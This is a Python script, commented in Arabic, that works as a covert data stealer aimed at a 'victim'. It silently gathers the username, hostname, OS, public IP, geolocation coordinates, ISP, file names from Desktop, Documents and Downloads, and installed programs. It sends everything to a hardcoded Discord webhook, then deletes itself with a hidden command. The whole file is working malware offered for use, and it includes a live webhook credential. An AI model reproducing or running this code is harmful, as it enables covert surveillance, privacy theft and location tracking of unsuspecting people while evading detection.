import os
import sys
import platform
import socket
import requests
import json
import subprocess
import time
import shutil
from datetime import datetime

# --- إعداداتك الخاصة ---
WEBHOOK_URL = "https://discord.com/api/webhooks/1485705281399951380/vq0MMpRxWwbxu81_b2sH0NyCuwJNylU105PRJCF37kwFDwuLbRMvnroWGai3a1dZ6ApE"
TAG = "#HTLr"
MSG_FOOTER = "Z7F LINK TRACK | DENGER ☢️"

def capture_everything():
    """جمع أدق التفاصيل من جهاز الضحية بصمت"""
    intel = {}
    try:
        # 1. معلومات الجهاز الأساسية
        intel['user'] = os.getlogin()
        intel['pc_name'] = socket.gethostname()
        intel['os'] = f"{platform.system()} {platform.release()} ({platform.version()})"
        intel['arch'] = platform.machine()
        intel['cpu'] = platform.processor()
        
        # 2. معلومات الشبكة والآيبي والحارة
        try:
            r = requests.get('http://ip-api.com/json/').json()
            intel['pub_ip'] = r.get('query')
            intel['isp'] = r.get('isp')
            intel['location'] = f"{r.get('city')}, {r.get('regionName')}, {r.get('country')}"
            intel['coords'] = f"Lat: {r.get('lat')}, Lon: {r.get('lon')}"
        except:
            intel['pub_ip'] = "N/A"

        # 3. سحب قائمة الملفات الحساسة (الأكثر أهمية)
        files_summary = []
        paths = {
            "Desktop": os.path.join(os.path.expanduser('~'), 'Desktop'),
            "Documents": os.path.join(os.path.expanduser('~'), 'Documents'),
            "Downloads": os.path.join(os.path.expanduser('~'), 'Downloads')
        }
        
        for name, path in paths.items():
            if os.path.exists(path):
                files_summary.append(f"--- {name} ---")
                files_list = os.listdir(path)
                files_summary.extend(files_list[:15]) # أول 15 ملف من كل مجلد لسرعة الأداة

        intel['files_list'] = "\n".join(files_summary)
        
        # 4. سحب البرامج المثبتة (لمعرفة زلات الضحية)
        if os.name == 'nt':
            try:
                apps = subprocess.check_output(['wmic', 'product', 'get', 'name']).decode('utf-8', errors='ignore')
                intel['apps'] = apps[:500] 
            except:
                intel['apps'] = "Locked/Access Denied"

    except Exception as e:
        intel['error'] = str(e)
    
    return intel

def send_payload(intel):
    """إرسال المعلومات للويبهوك بتنسيق هجماتي احترافي"""
    embed = {
        "title": f"🔓 تم اختراق صيدة جديدة! [{TAG}]",
        "description": f"المعلومات المسحوبة من جهاز الضحية بصمت التام.",
        "color": 16711680, # أحمر ناري
        "fields": [
            {"name": "👤 الضحية", "value": f"```User: {intel['user']}\nPC: {intel['pc_name']}```", "inline": True},
            {"name": "🌐 الشبكة والآيبي", "value": f"```IP: {intel['pub_ip']}\nLoc: {intel.get('location', 'N/A')}```", "inline": True},
            {"name": "💻 تفاصيل النظام", "value": f"```{intel['os']}```", "inline": False},
            {"name": "📡 الإحداثيات", "value": f"`{intel.get('coords', 'N/A')}`", "inline": True},
            {"name": "🏢 المزود (ISP)", "value": f"`{intel.get('isp', 'N/A')}`", "inline": True},
            {"name": "📂 كشف الملفات (Desktop/Docs)", "value": f"```\n{intel.get('files_list', 'No Files Access')[:1000]}```", "inline": False}
        ],
        "footer": {"text": f"{MSG_FOOTER} | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"},
        "thumbnail": {"url": "https://i.imgur.com/G4YUpV7.png"}
    }
    
    payload = {"username": "HTLr SILENT LOGGER", "embeds": [embed]}
    try:
        requests.post(WEBHOOK_URL, json=payload)
    except:
        pass

def self_destruct():
    """انتحار الملف: مسح السكربت من الجهاز نهائياً بصمت"""
    path = os.path.abspath(sys.argv[0])
    try:
        if os.name == 'nt': # Windows
            # تشغيل أمر مسح الملف بعد 3 ثواني لإعطاء وقت للإغلاق
            subprocess.Popen(f"timeout /t 3 & del /f /q \"{path}\"", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        else: # Linux/Android
            os.remove(path)
    except:
        pass

def main():
    # الأداة تعمل بصمت بدون طباعة برنت (إلا للتمويه لو بغيت)
    try:
        # الحصول على كل المعلومات
        intel_data = capture_everything()
        # إرسالها فوراً
        send_payload(intel_data)
    except:
        pass
    finally:
        # الانتحار والمسح
        self_destruct()
        sys.exit()

if __name__ == "__main__":
    main()
